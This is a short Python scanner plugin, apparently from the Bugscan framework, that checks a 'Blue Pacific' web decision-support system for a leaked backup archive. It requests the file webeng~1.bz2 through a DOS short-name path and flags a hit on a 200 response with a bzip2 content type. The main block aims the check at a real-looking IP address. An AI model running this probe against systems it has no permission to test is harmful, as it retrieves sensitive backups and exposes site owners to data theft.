#!/usr/bin/env python
# -*- coding: utf-8 -*
#蓝太平洋网站决策支持系统敏感信息泄露
import urlparse

def assign(service, arg):
    if service == 'luepacific':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
        
def audit(arg):
    payload = "webengine/backuppro/backup/webeng~1.bz2"
    code,head,res,_,_ = curl.curl2(arg+payload)
    if code ==200 and 'application/x-bzip2' in head:
        security_warning(arg+payload)
if __name__ == '__main__':
    from dummy import *
    audit(assign('luepacific','http://182.48.112.221/')[1])